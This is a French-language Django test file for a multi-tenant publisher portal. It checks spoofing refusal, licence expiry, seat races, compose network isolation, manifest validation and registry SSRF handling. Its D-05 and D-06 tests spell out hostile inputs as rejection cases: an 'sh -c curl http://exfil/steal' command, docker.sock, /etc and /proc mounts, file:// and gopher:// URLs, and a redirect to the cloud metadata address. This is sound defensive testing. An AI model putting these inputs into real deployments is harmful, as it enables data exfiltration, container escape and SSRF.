"""Groupe D — Portail éditeur (usurpation, licence, sièges, confinement,
manifeste, registre).

Six tests, D-01 à D-06, exécutés avec le framework Django du dépôt sur une base
de test SQLite jetable (`tools/dtests/settings_test.py`). Les énoncés proviennent
du brief de tâche D-01 (le plan `plan-tests-exhaustif-v3.md` est absent du
dépôt ; les attentes sont reprises telles quelles).

Chaque classe de test porte le code du plan (D-01 … D-06). Un code est `PASS`
seulement si toutes ses assertions sont vérifiées.
"""
import json
import tempfile
import threading
import urllib.error
import urllib.request
from datetime import date, timedelta
from pathlib import Path
from unittest import mock

import yaml
from django.contrib.auth.models import User
from django.test import SimpleTestCase, TestCase, TransactionTestCase, override_settings
from rest_framework import status

from applications.models import Application
from applications.registre import RegistreInjoignable, image_presente
from devices.models import Device
from licenses.models import License
from tenants.manifeste import ManifesteInvalide, valider
from tenants.models import Tenant
from tenants.pile import IMAGES_PILE

HOTE = '192.168.7.7'
DIGEST = 'sha256:' + 'ab' * 32
MANIFESTE_PILE = {
    'publie_le': '2026-10-29T00:00:00',
    'images': {nom: f'amane/{nom}@{DIGEST}' for nom in IMAGES_PILE},
}
# Manifeste d'application valide, conforme (base postgres + volume /data).
MANIFESTE_APP = {
    'type_artefact': 'docker',
    'image': 'editeurs/facturation@' + DIGEST,
    'commande': ['/app/serveur', '--port', '8080'],
    'port': 8080,
    'sante': '/sante',
    'variables': {'APP_ENV': 'production'},
    'base_de_donnees': {'variables': {
        'DATABASE_URL': 'postgres://{utilisateur}:{mot_de_passe}@{hote}:{port}/{base}',
    }},
    'volumes': [{'nom': 'fichiers', 'chemin': '/data'}],
}
REGLAGES = dict(ALLOWED_HOSTS=[HOTE, 'testserver'], REGISTRY_PORT='5000')
URL_REGISTER = '/api/devices/register/'


def ecrire_manifeste(media_root: str, contenu) -> None:
    dossier = Path(media_root) / 'node-images'
    dossier.mkdir(parents=True, exist_ok=True)
    texte = contenu if isinstance(contenu, str) else json.dumps(contenu)
    (dossier / 'pile.json').write_text(texte, encoding='utf-8')


def corps(response) -> str:
    if response.streaming:
        return b''.join(response.streaming_content).decode('utf-8')
    return response.content.decode('utf-8')


# ────────────────────────────────────────────────────────────────────────────
# D-01 — Usurpation : jeton du tenant B + installation_id du tenant A
# ────────────────────────────────────────────────────────────────────────────

class D01UsurpationTests(TestCase):
    """Un jeton valide du tenant B ne doit pas permettre d'usurper la machine
    d'un autre tenant (même `installation_id`) ni la modifier. Attendu : 403/409,
    machine A inchangée."""

    @classmethod
    def setUpTestData(cls):
        cls.tenant_a = Tenant.objects.create(name='PME A', email='a@pme.fr', employee_count=5)
        License.objects.create(tenant=cls.tenant_a, plan='starter', seats=5,
                               starts_at=date.today(), expires_at=date.today() + timedelta(days=30))
        cls.tenant_b = Tenant.objects.create(name='PME B', email='b@pme.fr', employee_count=5)
        License.objects.create(tenant=cls.tenant_b, plan='starter', seats=5,
                               starts_at=date.today(), expires_at=date.today() + timedelta(days=30))
        # Machine légitime du tenant A.
        cls.machine_a = Device.objects.create(
            tenant=cls.tenant_a,
            installation_id='aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa',
            hostname='machine-a', node_addr='192.168.1.10:9001', is_active=True,
        )

    def test_jeton_b_sur_installation_de_a_refuse(self):
        avant = (self.machine_a.hostname, self.machine_a.node_addr, self.machine_a.tenant_id)
        r = self.client.post(URL_REGISTER, {
            'tenant_token': str(self.tenant_b.registration_token),
            'installation_id': str(self.machine_a.installation_id),
            'hostname': 'machine-pirate',
            'node_addr': '10.0.0.9:9001',
        }, content_type='application/json', HTTP_HOST=HOTE)
        self.machine_a.refresh_from_db()
        apres = (self.machine_a.hostname, self.machine_a.node_addr, self.machine_a.tenant_id)
        modifiee = apres != avant
        self.assertIn(
            r.status_code, (status.HTTP_403_FORBIDDEN, status.HTTP_409_CONFLICT),
            f"attendu 403/409, obtenu {r.status_code} ; machine A modifiée={modifiee} "
            f"({avant} -> {apres}) ; corps={r.content!r}",
        )
        self.assertEqual(apres, avant, f"machine A modifiée par le tenant B : {avant} -> {apres}")


# ────────────────────────────────────────────────────────────────────────────
# D-02 — Licence expirée / inactive
# ────────────────────────────────────────────────────────────────────────────

class D02LicenceExpireeTests(TestCase):
    """Enregistrement sur licence expirée : 403 `license_expired` immédiat. Une
    licence `is_active=False` est prioritaire (403 `no_license`)."""

    def _enregistrer(self, tenant, installation_id):
        return self.client.post(URL_REGISTER, {
            'tenant_token': str(tenant.registration_token),
            'installation_id': installation_id,
        }, content_type='application/json', HTTP_HOST=HOTE)

    def test_licence_expiree_refusee(self):
        tenant = Tenant.objects.create(name='Expirée', email='exp@pme.fr', employee_count=2)
        License.objects.create(
            tenant=tenant, plan='starter', seats=5, is_active=True,
            starts_at=date.today() - timedelta(days=60),
            expires_at=date.today() - timedelta(days=1),
        )
        r = self._enregistrer(tenant, 'b0000000-0000-4000-8000-000000000001')
        self.assertEqual(
            r.status_code, status.HTTP_403_FORBIDDEN,
            f"licence expirée : attendu 403, obtenu {r.status_code} ; corps={r.content!r}",
        )
        self.assertEqual(r.json().get('reason'), 'license_expired', r.content)

    def test_licence_inactive_prioritaire(self):
        tenant = Tenant.objects.create(name='Inactive', email='inact@pme.fr', employee_count=2)
        License.objects.create(
            tenant=tenant, plan='starter', seats=5, is_active=False,
            starts_at=date.today() - timedelta(days=10),
            expires_at=date.today() + timedelta(days=10),
        )
        r = self._enregistrer(tenant, 'b0000000-0000-4000-8000-000000000002')
        self.assertEqual(
            r.status_code, status.HTTP_403_FORBIDDEN,
            f"licence inactive : attendu 403, obtenu {r.status_code} ; corps={r.content!r}",
        )
        self.assertEqual(r.json().get('reason'), 'no_license', r.content)


# ────────────────────────────────────────────────────────────────────────────
# D-03 — Sièges : deux enregistrements concurrents, licence à 1 siège
# ────────────────────────────────────────────────────────────────────────────

class D03SiegesConcurrentsTests(TransactionTestCase):
    """Deux `POST /api/devices/register` concurrents sur une licence à 1 siège :
    exactement 1×201 et 1×403, compte actif = 1, **à chaque exécution**.

    `TransactionTestCase` (pas `TestCase`) : les écritures des deux threads sont
    réellement commitées et visibles, condition d'une concurrence honnête. La
    base de test est un fichier SQLite (`settings_test`), partagé par les threads.

    Le scénario est répété `ITERATIONS` fois : le contrôle de sièges n'est pas
    atomique (`get_or_create` puis `count` puis `update`), donc l'issue dépend de
    l'entrelacement. On exige l'invariant à **chaque** itération et on agrège les
    écarts observés (plutôt qu'un test unique qui « passe » par chance).
    """

    ITERATIONS = 15

    def test_deux_requetes_concurrentes_une_seule_passe(self):
        deviations = []
        for it in range(self.ITERATIONS):
            tenant = Tenant.objects.create(name=f'Siège{it}', email=f'siege{it}@pme.fr',
                                           employee_count=1)
            License.objects.create(tenant=tenant, plan='starter', seats=1, starts_at=date.today())
            token = str(tenant.registration_token)

            barrier = threading.Barrier(2)
            resultats = {}
            erreurs = {}
            # `installation_id` est unique GLOBALEMENT (get_or_create non scopé au
            # tenant) : un identifiant par itération et par machine, sinon les
            # itérations suivantes retrouveraient les machines des précédentes.
            iid1 = f'c0000000-0000-4000-8000-{it:012d}'
            iid2 = f'd0000000-0000-4000-8000-{it:012d}'

            def requete(i, jeton, installation_id):
                from django.db import connections
                from rest_framework.test import APIClient
                client = APIClient()
                try:
                    barrier.wait(timeout=10)
                    r = client.post(URL_REGISTER, {
                        'tenant_token': jeton,
                        'installation_id': installation_id,
                        'node_addr': f'192.168.1.{20 + i}:9001',
                    }, content_type='application/json', HTTP_HOST=HOTE)
                    resultats[i] = r.status_code
                except Exception as exc:  # noqa: BLE001 — on capture pour le rapport
                    erreurs[i] = repr(exc)
                finally:
                    connections.close_all()

            t1 = threading.Thread(target=requete, args=(1, token, iid1))
            t2 = threading.Thread(target=requete, args=(2, token, iid2))
            t1.start()
            t2.start()
            t1.join(timeout=60)
            t2.join(timeout=60)

            codes = sorted(resultats.values())
            actifs = tenant.devices.filter(is_active=True).exclude(node_kind='temoin').count()
            if erreurs or codes != [status.HTTP_201_CREATED, status.HTTP_403_FORBIDDEN] or actifs != 1:
                deviations.append({'iteration': it, 'codes': resultats,
                                   'erreurs': erreurs, 'actifs': actifs})

        self.assertEqual(
            deviations, [],
            f"{len(deviations)}/{self.ITERATIONS} exécution(s) dévient de l'invariant "
            f"1×201 + 1×403 / actif=1 : {deviations}",
        )


# ────────────────────────────────────────────────────────────────────────────
# D-04 — Confinement du compose généré pour un tenant avec application
# ────────────────────────────────────────────────────────────────────────────

class D04ConfinementComposeTests(TestCase):
    """Compose d'un tenant avec application : réseau applicatif `internal`,
    application sans port publié, ss-node + HAProxy sur le réseau applicatif,
    PostgreSQL + etcd ailleurs."""

    @classmethod
    def setUpTestData(cls):
        cls.user = User.objects.create_user(username='pme-d04', password='x')
        cls.tenant = Tenant.objects.create(name='PME D04', email='d04@pme.fr',
                                           employee_count=5, user=cls.user)
        cls.licence = License.objects.create(tenant=cls.tenant, plan='pro', seats=3,
                                             starts_at=date.today())

    def setUp(self):
        self.media = tempfile.TemporaryDirectory()
        self.addCleanup(self.media.cleanup)
        ecrire_manifeste(self.media.name, MANIFESTE_PILE)
        reglages = override_settings(MEDIA_ROOT=self.media.name, **REGLAGES)
        reglages.enable()
        self.addCleanup(reglages.disable)
        self.client.force_login(self.user)
        app = Application.objects.create(nom='Facturation', editeur='Lumière', version='1.0',
                                         manifeste=valider(MANIFESTE_APP), statut=Application.VALIDEE)
        License.objects.filter(pk=self.licence.pk).update(application=app)

    def test_reseau_interne_sans_port_et_jonctions(self):
        r = self.client.get('/api/tenants/me/download/compose/', {'type': 'serveur'}, HTTP_HOST=HOTE)
        self.assertEqual(r.status_code, status.HTTP_200_OK, corps(r))
        doc = yaml.safe_load(corps(r))

        # Réseau applicatif interne (aucune sortie).
        self.assertTrue(doc['networks']['amane-application'].get('internal'),
                        f"réseau applicatif non interne : {doc['networks']['amane-application']}")
        # Application sans port publié.
        self.assertNotIn('ports', doc['services']['amane-application'],
                         f"application avec port publié : {doc['services']['amane-application'].get('ports')}")
        # ss-node et HAProxy rejoignent le réseau applicatif.
        for service in ('ss-node', 'amane-haproxy'):
            self.assertIn('amane-application', doc['services'][service]['networks'],
                          f"{service} absent du réseau applicatif")
        # PostgreSQL et etcd restent hors du réseau applicatif.
        for service in ('amane-postgresql', 'amane-etcd'):
            self.assertNotIn('amane-application', doc['services'][service]['networks'],
                             f"{service} présent à tort sur le réseau applicatif")


# ────────────────────────────────────────────────────────────────────────────
# D-05 — Manifeste dangereux (volumes sensibles, commandes, schémas d'URL)
# ────────────────────────────────────────────────────────────────────────────

class D05ManifesteDangereuxTests(SimpleTestCase):
    """`valider()` doit refuser catégoriquement (`ManifesteInvalide`) les
    manifestes dangereux : volumes `/var/run/docker.sock`, `/etc`, `/proc`,
    commande `sh -c curl…`, schémas `file://` et `gopher://`. Seuls `postgres://`
    et des chemins non sensibles sont acceptés."""

    def _cas(self):
        def avec(**modif):
            m = json.loads(json.dumps(MANIFESTE_APP))
            m.update(modif)
            return m
        return {
            'volume docker.sock': avec(volumes=[{'nom': 'sock', 'chemin': '/var/run/docker.sock'}]),
            'volume /etc': avec(volumes=[{'nom': 'etc', 'chemin': '/etc'}]),
            'volume /proc': avec(volumes=[{'nom': 'proc', 'chemin': '/proc'}]),
            'commande sh -c curl': avec(commande=['sh', '-c', 'curl http://exfil/steal']),
            'schema file://': avec(base_de_donnees={'variables': {'DATABASE_URL': 'file:///etc/passwd'}}),
            'schema gopher://': avec(base_de_donnees={'variables': {'DATABASE_URL': 'gopher://127.0.0.1:6379/_INFO'}}),
        }

    def test_manifestes_dangereux_refuses(self):
        acceptes = []
        for nom, manifeste in self._cas().items():
            try:
                valider(manifeste)
                acceptes.append(nom)
            except ManifesteInvalide:
                pass  # refusé : conforme à l'attendu
        self.assertEqual(acceptes, [], f"manifestes dangereux ACCEPTÉS : {acceptes}")

    def test_manifeste_sain_accepte(self):
        # Contrôle positif : le manifeste conforme (postgres:// + /data) passe.
        normalise = valider(MANIFESTE_APP)
        self.assertEqual(normalise['port'], 8080)
        self.assertEqual(normalise['volumes'], [{'nom': 'fichiers', 'chemin': '/data'}])


# ────────────────────────────────────────────────────────────────────────────
# D-06 — Registre : 401/403/500 = infrastructure ; 302 vers 169.254.169.254 = SSRF
# ────────────────────────────────────────────────────────────────────────────

IMAGE = 'editeurs/facturation@' + DIGEST
LINK_LOCAL = 'http://169.254.169.254/latest/meta-data/'


class _FakeResp:
    def __init__(self, status_code):
        self.status = status_code

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


class D06RegistreTests(TestCase):
    """Un registre qui répond 401/403/500 est une panne d'infrastructure (erreur,
    pas « image absente »/409). Une redirection 302 vers l'adresse lien-local
    (169.254.169.254) ne doit pas être suivie (SSRF bloqué)."""

    def test_401_403_500_erreur_infrastructure(self):
        # Attendu : `image_presente` signale une infrastructure injoignable
        # (RegistreInjoignable -> 503), pas une image absente (False -> 409).
        non_conformes = []
        for code in (401, 403, 500):
            err = urllib.error.HTTPError('http://registry:5000/v2/x/manifests/y', code, 'err', {}, None)
            with mock.patch('urllib.request.urlopen', side_effect=err):
                try:
                    res = image_presente(IMAGE)
                    non_conformes.append((code, f"retourne {res!r} au lieu de RegistreInjoignable"))
                except RegistreInjoignable:
                    pass  # conforme
        self.assertEqual(non_conformes, [], f"401/403/500 non traités en infrastructure : {non_conformes}")

    def test_302_vers_lien_local_bloque(self):
        # Faux urlopen fidèle au comportement par défaut d'urllib : il SUIT la
        # redirection 302 vers la cible. On enregistre chaque URL demandée.
        demandees = []

        def faux_urlopen(req, timeout=0):
            url = req.full_url
            demandees.append(url)
            if url.startswith('http://registry:5000/') or ':5000' in url:
                # Le registre répond 302 vers l'adresse lien-local.
                return faux_urlopen(urllib.request.Request(LINK_LOCAL, method='HEAD'), timeout)
            return _FakeResp(200)

        with mock.patch('urllib.request.urlopen', side_effect=faux_urlopen):
            image_presente(IMAGE)

        self.assertFalse(
            any(u.startswith('http://169.254.169.254') for u in demandees),
            f"SSRF : redirection vers 169.254.169.254 suivie (URL demandées : {demandees})",
        )

    def test_404_absente_et_200_presente(self):
        # Contrôles positifs du harnais.
        err404 = urllib.error.HTTPError('u', 404, 'absent', {}, None)
        with mock.patch('urllib.request.urlopen', side_effect=err404):
            self.assertFalse(image_presente(IMAGE))
        ok = _FakeResp(200)
        with mock.patch('urllib.request.urlopen', return_value=ok):
            self.assertTrue(image_presente(IMAGE))

    def test_vue_valider_401_rend_503_pas_409(self):
        # Au niveau HTTP : un brouillon dont le registre répond 401 doit donner
        # 503 (infrastructure), pas 409 (image absente).
        staff = User.objects.create_user(username='editeur-d06', password='x', is_staff=True)
        self.client.force_login(staff)
        r = self.client.post('/api/applications/', {
            'nom': 'Facturation', 'editeur': 'Lumière', 'version': '1.0', 'manifeste': MANIFESTE_APP,
        }, content_type='application/json')
        app_id = r.json()['id']
        err = urllib.error.HTTPError('http://registry:5000/v2/x/manifests/y', 401, 'err', {}, None)
        with mock.patch('urllib.request.urlopen', side_effect=err):
            r = self.client.post(f'/api/applications/{app_id}/valider/')
        self.assertEqual(
            r.status_code, status.HTTP_503_SERVICE_UNAVAILABLE,
            f"registre 401 : attendu 503, obtenu {r.status_code} ; corps={r.content!r}",
        )